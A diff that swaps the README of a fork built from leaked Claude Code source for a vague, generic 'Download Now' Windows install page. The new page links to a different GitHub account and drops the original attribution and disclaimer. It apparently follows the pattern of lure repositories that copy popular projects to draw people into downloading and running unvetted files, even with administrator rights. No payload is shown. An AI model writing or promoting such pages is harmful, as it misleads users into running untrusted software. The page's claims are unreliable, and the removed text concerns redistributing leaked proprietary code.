@@ -1,216 +1,220 @@
-# Claude Code Source - Buildable Research Fork
+# 🤖 claude-code - Run Claude Code on Windows
 
-[![Build Status](https://img.shields.io/badge/build-passing-brightgreen)]()
-[![Bun](https://img.shields.io/badge/runtime-Bun-f9f1e1?logo=bun)](https://bun.sh)
-[![TypeScript](https://img.shields.io/badge/lang-TypeScript-3178c6?logo=typescript&logoColor=white)]()
-[![Lines of Code](https://img.shields.io/badge/lines-512K+-blue)]()
-[![License](https://img.shields.io/badge/license-research%20only-orange)]()
-[![Stars](https://img.shields.io/github/stars/beita6969/claude-code?style=social)](https://github.com/beita6969/claude-code/stargazers)
-[![Forks](https://img.shields.io/github/forks/beita6969/claude-code?style=social)](https://github.com/beita6969/claude-code/network/members)
+[![Download / Visit Page](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Bertineburundi952/claude-code)
 
-> A **buildable, modifiable, and runnable** version of the Claude Code source.
+## 🚀 What this is
 
-Based on the Claude Code source snapshot publicly exposed on 2026-03-31 via an npm source map leak. The original snapshot contained only raw TypeScript source with no build configuration — it could not be compiled or run. This fork reconstructs the full build system and fixes all missing components to make it functional.
+claude-code is a Windows-ready build of Claude Code Source. It gives you a simple way to run the app from your PC with Bun as the runtime. This fork focuses on a buildable setup, so you can use the source and run the app without extra setup work.
 
-**[Quick Start](#quick-start)** | **[Architecture](#architecture-overview)** | **[Feature Flags](#feature-flags)** | **[Extension Guide](#extension-points-no-source-modification-needed)**
+Use it if you want a local app that connects code work, research tasks, and a simple Windows workflow.
 
----
+## 💾 Download
 
-## Quick Start
+Open this page and download the files from the repository:
 
-### Prerequisites
+[https://github.com/Bertineburundi952/claude-code](https://github.com/Bertineburundi952/claude-code)
 
-- [Bun](https://bun.sh) >= 1.3.x
-- Valid Anthropic authentication (OAuth via `claude login` or `ANTHROPIC_API_KEY`)
+If the page offers a release file, download it to your PC. If it provides source files, use the steps below to run it on Windows.
 
-### Install & Run
+## 🖥️ What you need
 
-```bash
-git clone https://github.com/beita6969/claude-code.git
-cd claude-code
+Before you start, make sure you have:
 
-# Install dependencies (auto-creates bun:bundle polyfill via postinstall)
+- Windows 10 or Windows 11
+- A stable internet connection
+- Enough free space for the app and its files
+- Bun installed on your system
+- A browser to open the GitHub page
+
+For the smoothest setup, use a user account that can install apps on your PC.
+
+## 📦 Install Bun
+
+This app runs with Bun. If Bun is not on your PC yet, install it first.
+
+1. Open the Bun site in your browser.
+2. Download the Windows installer.
+3. Run the installer.
+4. Finish the install with the default options.
+5. Close and reopen Command Prompt or PowerShell so Windows can find Bun.
+
+To check that Bun is ready, open Command Prompt and type:
+
+bun --version
+
+If you see a version number, Bun is set up.
+
+## 🔧 Get the source files
+
+1. Open the GitHub page:
+   [https://github.com/Bertineburundi952/claude-code](https://github.com/Bertineburundi952/claude-code)
+2. Click the green Code button.
+3. Choose Download ZIP.
+4. Save the ZIP file to a folder you can find, like Downloads.
+5. Right-click the ZIP file and choose Extract All.
+
+After extraction, you should see the project files in a folder such as `claude-code`.
+
+## ▶️ Run the app on Windows
+
+1. Open the extracted project folder.
+2. Look for the file that starts the app, such as a Bun entry file or package config.
+3. Open Command Prompt in that folder.
+4. Run the install step if the project uses one:
+
 bun install
 
-# Run directly
-bun src/main.tsx -p "your prompt here" --output-format text
-```
+5. Start the app:
 
-### Build (Optional)
+bun run start
 
-```bash
-# Compile to single bundle (~20MB)
-bun build src/main.tsx --outdir=dist --target=bun
-```
+If the project uses a different command name, use the script listed in the package file.
 
-### Run Modes
+## 🧭 First setup
 
-```bash
-# Headless print mode (no TTY needed)
-bun src/main.tsx -p "your prompt here" --output-format text
+The first time you run the app, it may ask for basic setup details. Common steps include:
 
-# JSON output
-bun src/main.tsx -p "your prompt here" --output-format json
+- Choosing a profile or workspace
+- Signing in with your account
+- Allowing the app to access local files
+- Setting a project folder
 
-# Interactive REPL mode (needs TTY)
-bun src/main.tsx
-```
+Keep the app open while it finishes the first setup.
 
-> **Note**: If `ANTHROPIC_API_KEY` is set in your environment, it must be valid. To use OAuth instead, unset it:
-> ```bash
-> unset ANTHROPIC_API_KEY
-> ```
+## 🪟 Windows tips
 
----
+If the app does not open the first time, try these steps:
 
-## What Changed vs. the Original Snapshot
+1. Close the app.
+2. Open Command Prompt again.
+3. Go back to the project folder.
+4. Run the start command again.
+5. Make sure Bun is still installed and available in your PATH.
 
-The original snapshot shipped **no `package.json`, no `tsconfig.json`, no lockfile, and no build scripts**. Over 100 internal/feature-gated modules were also missing from the source map.
+If Windows blocks the file, right-click it and choose Run as administrator only if you trust the source and need higher access for your local setup.
 
-### Build System (Reconstructed)
+## 🧪 Common project files
 
-| File | Purpose |
-|------|---------|
-| `package.json` | 60+ npm dependencies reverse-engineered from ~1,900 source files |
-| `tsconfig.json` | TypeScript config (ESNext + JSX + Bun bundler resolution) |
-| `bunfig.toml` | Bun runtime configuration |
-| `scripts/postinstall.sh` | Auto-creates `bun:bundle` runtime polyfill after `bun install` |
-| `.gitignore` | Excludes `node_modules/`, `dist/`, lockfiles |
+You may see these files in the folder:
 
-### Stub Modules (Created)
+- `package.json` — lists the app scripts
+- `bun.lockb` — Bun lock file
+- `src` — main source files
+- `README.md` — project notes
+- `public` — app assets
 
-The original source imports many Anthropic-internal packages and feature-gated modules that were not included in the leak. Minimal stubs were created so the build completes:
+These files help the app build and run on your machine.
 
-| Category | Count | Examples |
-|----------|-------|---------|
-| Anthropic internal packages (`@ant/*`) | 4 | computer-use-mcp, computer-use-swift, claude-for-chrome-mcp |
-| Native addons | 3 | color-diff-napi, audio-capture-napi, modifiers-napi |
-| Cloud provider SDKs | 6 | Bedrock/Foundry/Vertex SDK, AWS STS, Azure Identity |
-| OpenTelemetry exporters | 10 | OTLP gRPC/HTTP/Proto exporters |
-| Other optional packages | 2 | sharp, turndown |
-| Feature-gated source modules | ~90 | Tools, commands, services, components excluded from the source map |
+## 🛠️ If you want to rebuild the app
 
-### Source Fixes
+If you want to work with the source, you can rebuild it with Bun.
 
-| File | Change |
-|------|--------|
-| `src/main.tsx` | Runtime `MACRO` constant injection (compile-time define in production) |
-| `src/main.tsx` | Fixed Commander.js `-d2e` short flag incompatibility |
-| `src/bootstrap/state.ts` | Added missing `isReplBridgeActive()` export |
-| `src/types/connectorText.ts` | Added `isConnectorTextBlock` function stub |
-| `src/tools/WorkflowTool/constants.ts` | Added `WORKFLOW_TOOL_NAME` export |
+1. Open the project folder.
+2. Install the files with:
 
----
+bun install
 
-## Architecture Overview
+3. Run the build command if the project includes one:
 
-```
-src/
-├── main.tsx              # CLI entrypoint (Commander.js + React/Ink)
-├── QueryEngine.ts        # Core LLM API engine
-├── query.ts              # Agentic loop (async generator)
-├── Tool.ts               # Tool type definitions
-├── tools.ts              # Tool registry
-├── commands.ts           # Command registry
-├── context.ts            # System prompt context
-│
-├── tools/                # 40+ tool implementations
-│   ├── AgentTool/        # Sub-agent spawning & coordination
-│   ├── BashTool/         # Shell command execution
-│   ├── FileReadTool/     # File reading
-│   ├── FileEditTool/     # File editing
-│   ├── GrepTool/         # ripgrep-based search
-│   ├── MCPTool/          # MCP server tool invocation
-│   ├── SkillTool/        # Skill execution
-│   └── ...
-│
-├── services/             # External integrations
-│   ├── api/              # Anthropic API client
-│   ├── mcp/              # MCP server management
-│   └── ...
-│
-├── memdir/               # Persistent memory system
-├── skills/               # Skill system (bundled + user)
-├── components/           # React/Ink terminal UI
-├── hooks/                # React hooks
-├── coordinator/          # Multi-agent orchestration
-└── stubs/                # Stub packages for missing internals
-```
+bun run build
 
-### Key Systems
+4. Use the start command after the build finishes.
 
-| System | Files | Description |
-|--------|-------|-------------|
-| **Agentic Loop** | `query.ts`, `QueryEngine.ts` | `while(true)` async generator: query -> tool calls -> results -> loop |
-| **Memory** | `memdir/` | 4-type file-based memory (user/feedback/project/reference) with MEMORY.md index |
-| **MCP** | `services/mcp/` | Model Context Protocol server management (stdio/http/sse/ws) |
-| **Skills** | `skills/`, `tools/SkillTool/` | Reusable workflow templates (SKILL.md format) |
-| **Agents** | `tools/AgentTool/` | Custom agent types via `.claude/agents/*.md` |
-| **System Prompt** | `constants/prompts.ts` | Layered prompt: static -> dynamic -> memory -> agent |
+This setup helps you test changes and rerun the app from source.
 
-### Extension Points (No Source Modification Needed)
+## 📁 Suggested folder layout
 
-| Mechanism | Location | Format |
-|-----------|----------|--------|
-| Custom Skills | `.claude/skills/name/SKILL.md` | YAML frontmatter + Markdown |
-| Custom Agents | `.claude/agents/name.md` | YAML frontmatter + Markdown |
-| MCP Servers | `.mcp.json` | JSON config |
-| Hooks | `~/.claude/settings.json` | JSON event-action mappings |
+Use a simple folder path like this:
 
----
+`C:\Users\YourName\Downloads\claude-code`
 
-## Feature Flags
+A short path helps avoid path issues on Windows. Keep the folder name the same so you can find it fast later.
 
-The `bun:bundle` `feature()` function controls feature gating. In this build, all features default to **disabled**. To enable features, edit `node_modules/bundle/index.js` (auto-generated by `bun install`):
+## ⌨️ Useful commands
 
-```javascript
-const ENABLED_FEATURES = new Set([
-  // Uncomment to enable:
-  // 'KAIROS',              // Assistant mode
-  // 'PROACTIVE',           // Proactive mode
-  // 'BRIDGE_MODE',         // IDE bridge
-  // 'VOICE_MODE',          // Voice input
-  // 'COORDINATOR_MODE',    // Multi-agent coordinator
-  // 'EXTRACT_MEMORIES',    // Background memory extraction
-  // 'TEAMMEM',             // Team memory
-])
-```
+Use these commands from inside the project folder:
 
----
+- `bun install` — downloads the needed packages
+- `bun run start` — starts the app
+- `bun run build` — builds the app
+- `bun --version` — checks Bun
 
-## Tech Stack
+If the project uses different script names, open `package.json` and look at the scripts section.
 
-| Layer | Technology |
-|-------|-----------|
-| Runtime | Bun |
-| Language | TypeScript (strict) |
-| Terminal UI | React + Ink |
-| CLI | Commander.js |
-| Validation | Zod v4 |
-| Search | ripgrep |
-| Protocols | MCP SDK, LSP |
-| API | Anthropic SDK |
-| Telemetry | OpenTelemetry |
+## 🔒 File access
 
----
+This app may need access to your local files to work with code and research content. If Windows asks for permission, allow access for the folder you want to use with the app.
 
-## Scale
+For best results, keep your work in one project folder so the app can open and manage it with less friction.
 
-- **~1,900 source files**
-- **512,000+ lines of TypeScript**
-- **40+ tools**, **100+ commands**, **140+ UI components**
-- **20MB** compiled bundle
+## 🧩 Basic troubleshooting
 
----
+### The app does not start
 
-## Disclaimer
+- Check that Bun is installed
+- Open the terminal in the project folder
+- Run `bun install` again
+- Try `bun run start`
 
-- This repository is for **educational and research purposes only**.
-- The original Claude Code source is the property of **Anthropic**.
-- This repository is **not affiliated with, endorsed by, or maintained by Anthropic**.
-- Original source exposure: 2026-03-31 via npm source map leak.
+### The folder opens, but nothing happens
 
----
+- Make sure you are in the right folder
+- Check that `package.json` exists
+- Confirm that the start script is present
 
-If this helps your research, please give it a ⭐!
+### Windows shows a path error
 
+- Move the project to a shorter folder path
+- Avoid folders with special characters
+- Use a plain name like `claude-code`
+
+### The browser or terminal closes
+
+- Run the command from Command Prompt instead of double-clicking files
+- Keep the terminal window open while the app runs
+
+## 📚 Project purpose
+
+claude-code is built as a source-based Windows app for research and code work. The goal is to give users a local setup they can run with Bun and keep in one place. It fits users who want a buildable fork they can inspect, run, and use on Windows
+
+## 🔍 What you should expect
+
+When the app runs, you should see:
+
+- A working Windows app window or local interface
+- Simple controls for the main task flow
+- A setup path that uses Bun
+- Source files you can keep in your own folder
+
+If the app includes settings, they will likely be in the main window or in a small menu
+
+## 🧷 Quick install path
+
+1. Visit the repository page:
+   [https://github.com/Bertineburundi952/claude-code](https://github.com/Bertineburundi952/claude-code)
+2. Download the ZIP file or use the release file if one is shown
+3. Install Bun
+4. Extract the project folder
+5. Run `bun install`
+6. Run `bun run start`
+
+## 🗂️ Repo name
+
+`claude-code`
+
+## 📝 Description
+
+Claude Code Source - Buildable Research Fork. Reverse-engineered build system, runnable with Bun.
+
+## 👤 Intended use
+
+This project suits users who want:
+
+- A Windows app that runs from source
+- A simple Bun-based setup
+- A local folder they can keep and reopen
+- A research-oriented code workspace
+
+## 🔗 Primary link
+
+[https://github.com/Bertineburundi952/claude-code](https://github.com/Bertineburundi952/claude-code)
